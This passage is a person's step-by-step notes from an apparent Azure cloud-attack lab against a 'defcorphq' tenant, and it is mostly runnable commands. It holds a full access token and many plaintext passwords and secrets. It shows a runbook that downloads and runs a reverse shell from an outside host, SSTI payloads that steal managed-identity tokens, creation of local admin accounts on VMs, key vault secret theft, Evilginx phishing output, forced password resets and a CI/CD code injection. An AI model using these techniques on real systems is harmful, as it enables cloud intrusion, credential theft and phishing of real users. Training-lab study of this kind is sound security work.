Access Token: eyJ0eXAiOiJKV1QiLCJub25jZSI6InpSRnZKbjB6OGlQbWRJa2RUYzBNTHRibGFhTnhJWlFCRmdzWVVPaVZpQWciLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1HTHFqOThWTkxvWGFGZnBKQ0JwZ0I0SmFLcyIsImtpZCI6Ik1HTHFqOThWTkxvWGFGZnBKQ0JwZ0I0SmFLcyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTcyMDQ5MDA4NSwibmJmIjoxNzIwNDkwMDg1LCJleHAiOjE3MjA1NzY3ODUsImFpbyI6IkUyZGdZRmdhdFRSTHFlWnpUa1YxN3ZMVEJSOGVBQUE9IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0Z01BQUFBQUFBQUF3QUFBQUFBQUFBREVBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiSFo1cFF1WXBuRXl3anpKZk1fY2lBQSIsInZlciI6IjEuMCIsIndpZHMiOlsiMDk5N2ExZDAtMGQxZC00YWNiLWI0MDgtZDVjYTczMTIxZTkwIl0sInhtc19pZHJlbCI6IjE0IDciLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.cpVi_gLxGY9iX_80uLjJcwe8L1wEdhDcsu377zknhtxsrVuMr7yjG4NLvorPs_iiENk_YA2D_O_4njHp2-iZ-ZmY8kS-HODC5IqFwaHdrMr2Y3uz2Gq4wcjCJI4uNMzrAIl6an2q4_t9bYPVWuQwNvOY756rVlN1xKWwAZdDVF6DqJJX4ZztUDolaa7ZxtL7yvx1Erl7VFjhHFqoEHMIqKEyVdzt2OHj20JckkHm5KTef0NylcDvwYPdRZBsUuue_3qXYkYq6hw6t-ILc6Wg-VDH-uWb-uojMXbmnS779TRxZ-5JgOBRnuJ1yQBQ4d2Z_9gQmTYhvCVrucF-lH_RjA
ClientID: 62e44426-5c46-4e3c-8a89-f461d5d586f2
```

Now we can connect with the returned Managed Identity tokens:
```
$token = 'eyJ0eX..'
$graphaccesstoken = 'eyJ0eX..' 
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 62e44426-5c46-4e3c-8a89-f461d5d586f2
Get-AzResource
```


We are returned with this, which means our Managed Identity does not have rights to any resources:
```
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
    + CategoryInfo          : CloseError: (:) [Get-AzResource], ValidationException
    + FullyQualifiedErrorId : Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
```

Or we could try other AzPowershell modules:

```
Get-AzAdUser
Get-AzAdApplication
```

Still doesnt work!

Let's use the Graph API token with the REST API to list all Enterprise Applications in the defcorphq tenant:
```
$graphaccesstoken = 'eyJ0eX..'
```

```
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $graphaccesstoken"
}
}
(Invoke-RestMethod @RequestParams).value
```


We can view applications!
- the easiest way to check if we can abuse any of the Enterprise Applications (service principals) that we have listed above is to check if we can add credentials to any. This will allow us to abuse permissions assigned to the service principal:
```
. C:\AzAD\Tools\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphaccesstoken -Verbose
```
- SAVE THE SECRET OUTPUT!!

## Storage blob

There are multiple ways to control access to a storage account:

- RBAC Roles
- For Azure services there are 2 types of roles:- management plane roles and data plane roles
  - management plane roles
    - i.e., reader, contributor; acess roles - do not provide access to the data stored inside
  - Data plane roles
    - i.e., storage blob data reader - do not allow you to managed the storage account, only access the data stored inside
- shared keys (not changed or rotated automatically)
- shared access signatures (SAS); can be shared/used as URIs

```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureBlobs.ps1 
Invoke-EnumerateAzureBlobs -Base defcorp
```
Results gave me a container "backup" within the storage account "defcorpcommon" - ```https://defcorpcommon.blob.core.windows.net/backup?restype=container&comp=list```
within container was:
```
<EnumerationResults ServiceEndpoint="https://defcorpcommon.blob.core.windows.net/" ContainerName="backup">
<Blobs>
<Blob>
<Name>blob_client.py</Name>
...
```

So I can try goto this referenced python file thats stored in the blob by going to ```https://defcorpcommon.blob.core.windows.net/backup/blob_client.py```
- The browser doesnt allow access to the referenced blob so we try using Azure Storage Explorer GUI!
- Right click on Storage Accounts > Add Azure Storage > Blob Container/Storage Account > Using SAS > Paste the link

# Runbooks
Home> Automation Accounts> HybridAutomation | Runbooks
- Runbooks have a bunch of resources in them: powershell modules, python is available, credentials, certificates, etc. in GUI form. 
- Also they are very likely to be associated with a Managed Identity because they need to access other resources
- There is another account called "Run as" accounts - they are retired but if you find one = profit!
- **Contributor** role, easily abusable, and was by default
- Can run them as:
  - Azure Sandbox - spins up temporary container to execute code
  - Hybrid Runbook Worker - An installed agent on a non-azure machine i.e., on-prem, GCP - runs as SYSTEM on Windows; nxautomation on Linux
    - therefore if we can find a hybrid workers group and we can create runbooks we effectively have RCE on that host

#### Az CLI Recon
- make sure you have a [shell]() from before
- Now see whos logged in:
```az ad signed-in-user show```
**- Write down the objectID for this user**

- No surprise that the user Mark is using az cli from their workstation.
- The tasks tells us to find another user or group that has interesting permissions on an automation account.

```
az extension add --upgrade -n automation
az automation account list
```

- check for objects owned by the current user:
```az ad signed-in-user list-owned-objects```
**- Write down the objectID for target group**

#### Steal tokens for Student VM

- To be able to interact with Azure AD, request a token for graph. We can use that token with either module
  - MG:
```
az account get-access-token --resource-type ms-graph
$mgToken = 'eyJ0..'
```
- or AAD:
```
az account get-access-token --resource-type aad-graph
$aadToken = 'eyJ0..'
```

- Now that we have his token, we can use it from our student VM, not rely on the brittle Reverse shell, using MG:
```
Connect-MgGraph -AccessToken ($mgToken | ConvertTo-SecureString -AsPlainText -Force)
```
Or using AzureAD:
```TenantID``` can be found in the token output, the ```AccountID``` is the users objectId
```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -AadAccessToken $aadToken -TenantId 2d50cb29-5f7b-48a4-87ce-fe75a941adb6 -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
```



#### Adding to group 
- To be able to enumerate resources to the group we need a reader role for the group (even though we are the owner?)
- So, let's add Mark (the owner) as a member of the group. 
  - MG:
  - In the below command ```–GroupId``` is for the group object id.
```
$params = @{"@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/f66e133c-bd01-4b0b-b3b7-7cd949fd45f3"}
New-MgGroupMemberByRef -GroupId e6870783-1378-4078-b242-84c08c6dc0d7 -BodyParameter $params
```
- OR AAD:
  - In the below command ```–ObjectiD``` is for the target Group and ```–RefObjectId``` is the users objectID.
```
Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObjectId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 -Verbose
```
#### Enumerate resources i.e., Role Assignments for Automation Account
- Now moving back to the shell, and having added Mark to the group, we should be able to enum resources i.e., Automation Accounts
- Now, we can use az cli to check for automation accounts. Run the below command on the reverse shell:
```az automation account list```
- Now, we should be able to list roles assigned to Mark using ```az role assignment list --assignee MarkDWalden@defcorphq.onmicrosoft.com``` on the reverse shell but it does not return an output.
- Therefore, we request an access token for ARM and use the one for aad-graph that we requested earlier and use both with Az PowerShell, back on the **Student VM**.

Request tokens from the shell with Azure CLI:
```
az account get-access-token
az account get-access-token --resource-type aad-graph
```

- Back on the **STUDENT VM** use the tokens with Az PowerShell: 
```
PS C:\AzAD\Tools> $AccessToken = 'eyJ0…'
PS C:\AzAD\Tools> $AADToken = 'eyJ0…'

PS C:\AzAD\Tools> Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
```

Now we can run the below command to look at the roles for Mark (added to the Aumtation Accounts group) on the automation account: 
```
PS C:\AzAD\Tools> Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
```

- Sweet! The above output means Mark has Contributor role on the automation account.
- This means we can create and execute Runbooks!

- Use the below command to check if a hybrid worker group is in use by the automation account:
```
PS C:\AzAD\Tools> Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
```

### Create Runbook
#### Prep runbook

- We are going to Import a powershell script ```C:\AzAD\Tools\studentx.ps1``` as a PowerShell runbook. This script will download the Invoke-PowerShellTCP.ps1 reverse shell from your student VM (which we are hosting out of ```C:\xampp\htdocs```) and execute on the hybrid worker.
- The script we will create to be imported as a runbook:
```
iex (New-Object Net.Webclient).downloadstring("http://172.16.152.213:82/Invoke-PowerShellTcp.ps1")
Power -Reverse -IPAddress 172.16.152.213 -Port 1234
```

- Host the ```Invoke-PowerShellTCP.ps1``` by copying it to the ```C:\xampp\htdocs``` and starting Apache using xampp.

#### Import Runbook
- Run the below command in the PowerShell session where you connected using the access token for Mark. It may take couple of minutes:
```
Import-AzAutomationRunbook -Name studentx -Path C:\AzAD\Tools\studentx.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
```

- Publish the runbook so that we can use it:
```
Publish-AzAutomationRunbook -RunbookName studentx -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```
#### Run runbook
- Start a netcat listener on your student VM. Remember to listen on the port that you specified in the runbook studentx:
```
C:\AzAD\Tools\netcat-win32-1.12\nc64.exe -lvp 4444
```

Finally, start the runbook: 
```
Start-AzAutomationRunbook -RunbookName studentx -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

On the listener, you should see a connect back and we can execute commands!

## Run Command

#### Run a script 
A powershell script to add users below:
```
$passwd = ConvertTo-SecureString "Stud213Password@123" -AsPlainText -Force
New-LocalUser -Name student213 -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student213
```
Now we can run the script via VMRumCommand:
```
Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
```

#### Get Public IP of VM
```
Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering
Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile

Get-AzNetworkInterface -Name bkpadconnect368

Get-AzPublicIpAddress -Name bkpadconnectIP
```

#### Connect to VM
Now we are a user on the VM and we know the publically addressable IP, we can connect directly to it using PS Remoting
```
$password = ConvertTo-SecureString 'Stud213Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student213', $Password) 
$sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) 
Enter-PSSession $sess
```
#### Extract Credentials from VM
Main Credentials to extract from host:
- lsass (heavily scrutinised - try all below first)
- LSA Secrets regkey
- SAM hive
- Credential Manager
- Scheduled Tasks
- powershell history (EXTREMELY common now due to the way cloud works for sysadmins to connect - always putting creds on the commandline)
- browser credentials & cookies (DPAPI Protected)

```
cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Keyvault
We already [enumerated](https://github.com/conma293/Azure/blob/main/killcycle.md#server-side-template-injection-ssti) that the managed identity of the 'vaultfrontend' app service (https://vaultfrontend.azurewebsites.net) can access the keyvault 'ResearchKeyVault'.

#### Gain access by stealing identity
Request a new ARM access token using the below command:
```
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```

To be able to access the keyvault, we need to request a keyvault access token:
```
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
```

Now we can connect using Az PowerShell and use both the arm token and keyvault token:
```
$token = 'eyJ0..'
$keyvaulttoken = 'eyJ0..'
Connect-AzAccount -AccessToken $token -KeyVaultAccessToken $keyvaulttoken -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc
```

#### Keyvault
Now we can actually interact with the keyvault:
```
Get-AzKeyVault

Get-AzKeyVaultSecret -VaultName ResearchKeyVault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
```
Result:
```
username: kathynschaefer@defcorphq.onmicrosoft.com ; password: KathyFoUndInth3KeyVault@Azur3
```

ok we cant logon to the Azure Portal and it doesnt tell us why.... Conditional Access Policy!!
OK so lets try with AZ Powershell (may just be browser that is blocked):
```
$password = ConvertTo-SecureString 'KathyFoUndInth3KeyVault@Azur3' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds
```
#### New User Enumeration
We are in, lets see what we have access to:
```Get-AzResources```

A VM! Interesting... what roles do we have access to:
```
Get-AzRoleAssignment
Get-AzRoleAssignment | select DisplayName, RoleDefinitionName, ObjectType, CanDelegate
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
```

Let's get some information about the VM admins group and its membership:
```
Get-AzADGroup -DisplayName 'VM Admins' 
Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select DisplayName
```
#### Administrative Units
Ok lets do some manual API enum:

```
$Token=(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
$URI = 'https://graph.microsoft.com/v1.0/users/VMContributor213@defcorphq.onmicrosoft.com/memberOf'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
Ok the user is part of an Administrative Unit called ```controlunit``` (an is similar to an Organisational Unit - OU, from AD)
ok lets bring in AzureAD:
```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
Connect-AzureAD -Credential $creds 
Get-AzureADMSAdministrativeUnit -Id e1e26d93-163e-42a2-a46e-1b7d52626395
```
Let's check for any roles scoped to this administrative unit: 
```
Get-AzureADMSScopedRoleMembership -Id e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
```
Let's check the role using the RoleId we got above: 
```
Get-AzureADDirectoryRole -ObjectId 5b3935ed-b52d-4080-8b05-3a1832194d3a
```
So, know we know that the user Roy has Authentication Administrator privileges scoped to the Control Unit administrative unit!
Get some more details about the user Roy:
```
Get-AzureADUser -ObjectId 8c088359-66fb-4253-ad0d-a91b82fd548a | fl *
```
### Phish and use Roys creds

We phish Roy using [Evilginx](https://github.com/conma293/Azure/blob/main/2.12_Evilginx2.md) to get his credentials!

```
[04:32:13] [imp] [0] [o365] new visitor has arrived: python-requests/2.25.1 (172.16.2.113)
[04:32:13] [inf] [0] [o365] landing URL: https://login.login.student213.corp/rcewDmff
[04:32:43] [+++] [0] Password: [Auth3nticatedPers0n@InDefHQtenant]
[04:32:43] [+++] [0] Username: [roygcain@defcorphq.onmicrosoft.com]
[04:32:43] [+++] [0] Username: [roygcain@defcorphq.onmicrosoft.com]
```

Now we can connect to target Tenant as Roy:
```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
$password = ConvertTo-SecureString 'Auth3nticatedPers0n@InDefHQtenant' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('roygcain@defcorphq.onmicrosoft.com', $password)
Connect-AzureAD -Credential $creds
```

Because Roy has ```authentication administrator``` role scoped to the ```Control Unit``` administrative unit, and VMContributor213 users are member of the administrative unit, reset the password for VMContributor213@defcorphq.onmicrosoft.com:
```
$password = "VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText –Force
(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "VMContributor213@defcorphq.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $Password –Verbose
```

Disconnect from Azure AD and connect using the credentials of the VMContributor213@defcorphq.onmicrosoft.com user:
```
Disconnect-AzureAD
$password = ConvertTo-SecureString 'VM@Contributor@123@321' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('VMContributor213@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds
```

Now more ENUM:
```
Get-AzVM -Name jumpvm
Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | fl *
Get-AzVM -Name jumpvm -ResourceGroupName RESEARCH | select -ExpandProperty NetworkProfile
Get-AzPublicIpAddress -Name jumpvm-ip
```

Finally, run a PowerShell script on jumpVM and add a user to it. Remember to modify the C:\AzAD\Tools\adduser.ps1 if not done already:
```
Invoke-AzVMRunCommand -ScriptPath C:\AzAD\Tools\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'jumpvm' -ResourceGroupName 'Research' –Verbose
```

And we can now connect to the VM using the user that we just added ((here we are assuming that the VM's configuration allows local users to connect remotely)):
```
$password = ConvertTo-SecureString 'Stud213Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student213', $password)
$jumpvm = New-PSSession -ComputerName 51.116.180.87 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession -Session $jumpvm
```

## Enterprise Applications
#### Initial enumeration of Frontend Enterprise App and Functional App we were able to add a client secret to

- [Earlier] we found out that the managed identity for the VirusScanner webapp has permissions to add secrets to the enterprise application ```fileapp```
- Managed identities are special service principals.
- That means, we can enumerate the service principals in Azure AD and check the service principal that the AppID ```62e44426-5c46-4e3c-8a89-f461d5d586f2``` belongs to:
```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1 
$passwd = ConvertTo-SecureString "V3ryH4rdt0Cr4ckN0OneCr4ckTh!sP@ssw0rd" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds 
```
```
Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "62e44426-5c46-4e3c-8a89-f461d5d586f2"} | fl
```

_DisplayName : processfile [snip] 

ServicePrincipalType : ManagedIdentity_

- So the token we got is actually for the managed identity of the function app processfile!
- Note that this will not impact further attacks. We looked at it just to understand that function apps may be in use behind app services.
- In fact, that is the most common use case of function aps.
- In this case, the processfile function app is processing the fileuploads to the virusscanner app service.

#### Enumerate with client secret
- Recall that we added credentials to the fileapp application in Azure AD. 
- Let's use the credentials now to authenticate as that service principal. 
- Please remember you may need to change the secret in the command below to the one that you added earlier

The below User field for our creds object is the ```AppId``` value for the Functional App ```FileApp```, which was returned when we added a secret to it:
```
$password = ConvertTo-SecureString 'mCL8Q~Kg~bAOBm3d0WhtbFiuuRP53Ix6eQ5qTbrJ' -AsPlainText -Force 
$creds = New-Object System.Management.Automation.PSCredential('f072c4a6-b440-40de-983f-a7f3bd317d8f', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 2d50cb29-5f7b-48a4-87ce-fe75a941adb6
```
**WARNING: The provided service principal secret will be included in the 'AzureRmContext.json' file found in the user profile ( C:\Users\studentuserx\.Azure). Please ensure that this directory has appropriate protections.**

Now, list the resources readable by the service principal:
```
Get-AzResource
```

Sweet! Access to a key vault! Check if we can list and read any secrets! 
```
Get-AzKeyVaultSecret -VaultName credvault-fileapp
Get-AzKeyVaultSecret -VaultName credvault-fileapp -Name MobileUsersBackup -AsPlainText
```
#### Deployment Template
Let's use the above credentials to authenticate:
```
$password = ConvertTo-SecureString 'IpadPr0@M0b1leUs3r@t0rganization' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DavidDHenriques@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds
```

We try to sign into azure.portal and get this:
```
You cannot access this right now
Your sign-in was successful but does not meet the criteria to access this resource. For example, you might be signing in from a browser, app, or location that is restricted by your admin.
Sign out and sign in with a different account
```
Conditional access policy == Toxic relationship. It is upset but doesnt tell you why



- Press F12 and choose another device type lol > iPad Pro
- Now within the Portal goto ```Resources> Resource Groups> StagingEnv> Settings> Deployments> Template```
- Grab the creds within the ARM Template development history

## Function Apps
#### Github and CI/CD exploit
Using the creds we [got] for Github lets login - goto ```https://github.com/DefCorp/SimpleApps```
creds work but we need mfa... dont worry we have the backup too - put it into google authenticator extension for chrome


now go into student folder > ```__init__.py``` and replace with the contents of the ```run.py``` file we stole from the unsecured storage blob earlier:
```
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
	logging.info('Python HTTP trigger function processed a request.')
	IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
	IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
	cmd = 'curl "%s?resource=https://management.azure.com&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
	val = os.popen(cmd).read()
	return func.HttpResponse(val, status_code=200)
```

This is just yet another curl request for an acess token, which we can execute in the CI/CD Pipeline by navigating to - ```https://simpleapps.azurewebsites.net/api/Student213``` 

```
Connect-AzAccount -AccessToken $AccessToken -AccountId 95f40eea-6653-4e11-b545-d9c2f5f90a29

Get-AzResourceGroup 
Get-AzResourceGroupDeployment -ResourceGroupName SAP
```
Save the deployment template locally. Run the below command:
```
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName SAP -DeploymentName stevencking_defcorphq.onmicrosoft.com.sapsrv
```

Use the below command to quickly look for credentials:
```
(cat C:\AzAD\Tools\stevencking_defcorphq.onmicrosoft.com.sapsrv.json |ConvertFrom-Json |select -ExpandProperty Resources).resources.Properties.Settings.CommandToExecute
```
New credentials!

#### Stephen King


lets logon as stephen:
```
$password = ConvertTo-SecureString 'St3v3nc@nReadStorAg3@ccounts987' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('stevencking@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds
```

we see a storage blob, lets see whats inside:
```
Get-AzStorageContainer -Context (New-AzStorageContext -StorageAccountName defcorpcodebackup)
```

We can use Azure Storage Explore to navigate to these containers for download: ```Right click storage account > connect to azure storage > subscription (if you have user) or storage account/blob```

We get what looks like an SSH Key in the form of ```id_rsa```


We can copy that directly into our users ```.ssh``` folder and use the key (run as admin):
```
mkdir C:\Users\studentuser213\.ssh
copy C:\Users\studentuser213\Downloads\defcorp\Storage blobs\stephenking\id_rsa C:\Users\studentuser213\.ssh\id_rsa
```

Then connect:
```
ssh -T git@github.com
```

When prompted use the creds we found earlier (cred re-use/stuffing): ```sL3B9zvf6@wCar8dYWqm7e```

Next, clone the CreateUsers GitHub repository! We know that jenniferazuread have the rights to modify the CreateUsers repo by looking at the commit history! 
```
C:\AzAD\Tools>git clone git@github.com:DefCorp/CreateUsers.git
```

The README of this repo mentions that it can be used for creating users in DefCorphq tenant for accessing Enterprise Applications. There is an example 'user.json' file in the Example directory. The README also points to a function app URL to create the users - ```https://createusersapp.azurewebsites.net/api/CreateUsersApp?id=```
Let’s use that file! Go to the CreateUsers directory, create a directory for your student ID and copy the user.json file to your studentx directory:

user.json==
```
{ "accountEnabled": true,
"displayName": "studentx",
"mailNickname": "studentx",
"userPrincipalName": "studentx@defcorphq.onmicrosoft.com",
"passwordProfile" : { "forceChangePasswordNextSignIn": false, "password": "StudxPassword@123" }
}
```



```
cd CreateUsers
mkdir student213 
copy C:\AzAD\Tools\CreateUsers\Example\user.json C:\AzAD\Tools\CreateUsers\student213\user.json
cd student213
```

Finally, commit the changes to the CreateUsers repo using the following commands:
```
git add .
git config --global user.email "81172144+jenniferazad@users.noreply.github.com" 
git config --global user.name "jenniferazad"
git commit -m "Update"
git push
```

Now browse to the function app and it should create a user for us: ```https://createusersapp.azurewebsites.net/api/CreateUsersApp?id=213```

# Lateral Movemement
Hardcoding Credentials is the easiest way to get things done!
## VM User Data
## Script Extension
## Primary Refresh Token
